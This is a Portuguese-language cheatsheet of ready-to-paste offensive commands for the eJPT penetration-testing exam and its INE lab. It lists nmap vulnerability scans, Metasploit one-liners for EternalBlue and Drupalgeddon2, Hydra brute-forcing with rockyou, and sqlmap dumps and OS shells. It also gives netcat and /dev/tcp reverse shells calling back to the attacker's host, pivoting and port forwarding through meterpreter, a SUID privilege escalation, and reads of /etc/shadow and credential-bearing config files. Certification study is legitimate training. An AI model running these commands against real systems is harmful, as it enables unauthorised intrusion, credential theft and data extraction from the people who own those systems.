# CHEATSHEET eJPT — Comandos Prontos
LIBERTUS · atualizado 2026-07-01 · comandos testados no arsenal local.
No lab da INE substituir IPs. `<IP>` = alvo, `<KALI>` = IP do Kali (do `ip addr`).

---

## 0. Descoberta inicial (SEMPRE primeiro)
```bash
ip addr                              # meu IP e range da rede
nmap -sn 192.168.X.0/24              # ping sweep — lista hosts vivos
# excluir da contagem: .1 (gateway) e o próprio Kali
```

---

## 1. NMAP

### Scans essenciais
```bash
nmap -sn 192.168.X.0/24                       # descoberta de hosts (sem porta)
nmap -sV -sC <IP>                             # versão + scripts default (rápido, o mais usado)
nmap -p- <IP>                                 # TODAS as 65535 portas TCP
nmap -sV -p- --open <IP>                      # todas portas + versão, só abertas
nmap -A -Pn <IP>                              # agressivo (OS, versão, scripts, traceroute)
nmap -sU --top-ports 20 <IP>                  # top 20 portas UDP
nmap -sV -p 21,22,80,139,445,3306,3389 <IP>   # scan direcionado
```

### Flags úteis
| Flag | O que faz |
|------|-----------|
| `-sV` | detecta versão do serviço |
| `-sC` | roda scripts NSE default |
| `-A` | OS + versão + scripts + traceroute |
| `-p-` | todas as portas (1-65535) |
| `-Pn` | pula ping (assume host up — Windows firewall) |
| `-sn` | só ping sweep (descoberta) |
| `-O` | detecção de SO (menos confiável que smb-os-discovery) |
| `-oN arq` | salva output normal em arquivo |
| `-T4` | mais rápido (ok em lab) |

### Scripts NSE por serviço
```bash
# SMB (445) — MS17-010 é o mais cobrado
nmap -p445 --script smb-vuln-ms17-010 <IP>            # checa EternalBlue
nmap -p445 --script smb-os-discovery <IP>             # versão exata do Windows
nmap -p445 --script smb-enum-shares,smb-enum-users <IP>
nmap -p445 --script "smb-vuln-*" <IP>                 # todas vulns SMB

# FTP (21)
nmap -p21 --script ftp-anon,ftp-syst <IP>             # checa login anônimo
nmap -p21 --script ftp-vuln-cve2010-4221 <IP>

# HTTP (80/8080/443)
nmap -p80 --script http-enum <IP>                     # enumera dirs/apps
nmap -p80 --script http-title,http-headers <IP>
nmap -p80 --script http-methods,http-webdav-scan <IP>
nmap --script vuln <IP>                                # todas vulns conhecidas (lento)
```

---

## 2. METASPLOIT

### Fluxo padrão
```bash
msfconsole -q                        # inicia (-q = sem banner)
search ms17-010                      # busca módulo
use exploit/windows/smb/ms17_010_eternalblue
show options                         # ver o que precisa configurar
set RHOSTS <IP>                      # alvo
set LHOST <KALI>                     # meu IP (para o shell voltar)
set LPORT 4444
run                                  # ou: exploit
```

### ⚠️ ONELINER (essencial no lab INE — copy/paste do terminal é bugado)
```bash
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <IP>; set LHOST <KALI>; run"
```
Isso configura e roda TUDO de uma vez, evitando colar comando por comando.

### Se falhar "Cannot reliably check exploitability"
```
set ForceExploit true
run
```

### Módulos mais cobrados no eJPT
```bash
# EternalBlue (SMB / porta 445) — o clássico
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/smb/smb_ms17_010     # só checar, sem explorar

# FTP anônimo / vsftpd backdoor
use auxiliary/scanner/ftp/anonymous
use exploit/unix/ftp/vsftpd_234_backdoor

# SSH bruteforce
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <IP>; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; run

# SMB enumeração de versão
use auxiliary/scanner/smb/smb_version

# Drupal (visto na sessão real de exame)
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS <IP>; set TARGETURI /drupal; run
```

### Meterpreter — comandos pós-exploração
```
sysinfo                    # info do sistema
getuid                     # usuário atual
shell                      # cai num shell do SO
hashdump                   # dump de hashes (Windows, precisa SYSTEM)
sessions -l                # lista sessões
sessions -i 1              # interage com sessão 1
background                 # manda sessão pro fundo (Ctrl+Z)
search -f *.txt            # procura arquivos
download /path arquivo     # baixa arquivo
```

---

## 3. HYDRA (brute force)

```bash
# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP>
hydra -L users.txt -P pass.txt ssh://<IP> -t 4

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>

# HTTP POST form (login web) — F= string de falha
hydra -l admin -P rockyou.txt <IP> http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Login failed"

# HTTP GET Basic Auth
hydra -l admin -P pass.txt <IP> http-get /admin

# SMB
hydra -l administrator -P pass.txt smb://<IP>

# RDP
hydra -l admin -P pass.txt rdp://<IP>
```
Flags: `-l` user único · `-L` lista users · `-p` senha única · `-P` lista senhas ·
`-t N` threads · `-f` para no 1º sucesso · `-V` verboso · `-s PORTA` porta custom.

**⚠️ rockyou é LENTO em SSH (horas).** No exame preferir: credenciais achadas em
arquivos (FTP/settings.php), credenciais padrão (admin/admin, drupal/drupal),
ou wordlist curta. Só brutar quando não houver atalho.

---

## 4. GOBUSTER

```bash
# Diretórios
gobuster dir -u http://<IP> -w /usr/share/wordlists/common.txt -t 30 -q

# Com extensões
gobuster dir -u http://<IP> -w /usr/share/wordlists/common.txt -x php,txt,html,bak

# Só status codes específicos / mostrar tamanhos
gobuster dir -u http://<IP> -w common.txt -s 200,301,302 -b ""

# DNS subdomínios
gobuster dns -d alvo.com -w wordlist.txt

# Vhosts
gobuster vhost -u http://<IP> -w wordlist.txt
```
Wordlists locais: `/usr/share/wordlists/common.txt`.
**No Kali da INE:** rockyou vem comprimido → `gunzip /usr/share/wordlists/rockyou.txt.gz`.
Para dirs no Kali INE usar `/usr/share/wordlists/dirb/common.txt` ou seclists.
Flags: `-t` threads · `-q` silencioso · `-x` extensões · `-b` blacklist status ·
`-k` ignora SSL.

---

## 5. SQLMAP

```bash
# Detecção básica (GET)
sqlmap -u "http://<IP>/page.php?id=1" --batch

# Enumerar bancos
sqlmap -u "http://<IP>/page.php?id=1" --dbs --batch

# Tabelas de um banco
sqlmap -u "http://<IP>/page.php?id=1" -D nomedb --tables --batch

# Colunas e dump
sqlmap -u "http://<IP>/page.php?id=1" -D nomedb -T users --columns --batch
sqlmap -u "http://<IP>/page.php?id=1" -D nomedb -T users --dump --batch

# POST (dados no corpo)
sqlmap -u "http://<IP>/login.php" --data="user=a&pass=b" --batch

# Com cookie autenticado
sqlmap -u "http://<IP>/page.php?id=1" --cookie="PHPSESSID=xxx" --batch

# Pegar shell no SO (se possível)
sqlmap -u "http://<IP>/page.php?id=1" --os-shell --batch
```
Flags: `--batch` responde tudo sim (não interativo) · `--dbs` bancos ·
`--dump` extrai dados · `--level 5 --risk 3` mais agressivo · `-p param` testa param específico.

---

## 6. NETCAT

```bash
# Escutar (listener — no MEU Kali, para receber shell)
nc -lvnp 4444

# Reverse shell (rodar NO ALVO — o alvo conecta de volta em mim)
nc -e /bin/bash <KALI> 4444           # Linux com -e
bash -i >& /dev/tcp/<KALI>/4444 0>&1  # sem -e (bash puro)
nc.exe -e cmd.exe <KALI> 4444         # Windows

# Bind shell (alvo abre porta esperando conexão)
nc -lvnp 4444 -e /bin/bash            # no alvo
nc <IP> 4444                          # eu conecto

# Banner grabbing / conectar num serviço
nc -nv <IP> 21                        # ver banner FTP
nc -nv <IP> 25                        # SMTP

# Transferência de arquivo
nc -lvnp 4444 > recebido.txt          # receptor
nc <IP> 4444 < arquivo.txt            # emissor

# Estabilizar shell (depois de pegar reverse shell)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# depois: Ctrl+Z ; stty raw -echo ; fg ; enter enter
```

---

## 7. PIVOTING (Metasploit) — obrigatório no eJPT

Depois de ter uma sessão meterpreter num host dual-homed (ex: .52):

```bash
# 1. Descobrir a rede interna (dentro da sessão/shell)
ipconfig /all         # Windows — olhar "DNS Servers" e IPs adicionais
ip addr ; ip route    # Linux
arp -a                # hosts que já falaram com o alvo

# 2. Adicionar rota via autoroute (do meterpreter)
run autoroute -s 192.168.0.0/24
# ou moderno:
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.168.0.0
run

# 3. Ver rotas ativas
route print          # dentro do msf: route

# 4. Scanner pela rota (agora alcança a rede interna)
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.0.1-254
set PORTS 22,80,445,3389
run

# 5. Port forward (expor porta interna no meu Kali)
# no meterpreter:
portfwd add -l 3389 -p 3389 -r 192.168.0.50
# agora acesso 127.0.0.1:3389 no Kali → chega no .50 interno

# 6. Socks proxy (usar ferramentas externas pela rota)
use auxiliary/server/socks_proxy
set VERSION 4a
run
# + proxychains: editar /etc/proxychains.conf → socks4 127.0.0.1 1080
proxychains nmap -sT -Pn 192.168.0.50
```

### Comandos-chave de pivot (decorar os NOMES para questões teóricas)
- `autoroute` → adiciona rota de rede via sessão meterpreter
- `portfwd` → encaminha porta específica
- `socks_proxy` + `proxychains` → tunelar ferramentas externas

---

## 8. Pós-exploração Linux (privesc — gap da 1ª tentativa)
```bash
whoami; id; sudo -l                   # o que posso fazer
find / -perm -4000 2>/dev/null         # binários SUID
# SUID find → root (foi o gap do exame anterior):
/usr/bin/find . -exec /bin/sh -p \; -quit
cat /etc/passwd; cat /etc/shadow       # se root, dump de hashes
# ler config web com credenciais de DB:
cat /var/www/html/drupal/sites/default/settings.php
cat /var/www/html/wp-config.php
```

## 9. Quebrar hashes (John — local usar wrapper jl.sh)
```bash
# separar shadow+passwd (Linux)
unshadow passwd.txt shadow.txt > hashes.txt
# LOCAL (LIBERTUS):
~/LIBERTUS/ejpt/john_home/jl.sh hashes.txt --format=sha512crypt
# NO KALI INE (john completo):
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hashes.txt
# formatos comuns: md5crypt, sha512crypt, NT (Windows), Raw-MD5
```
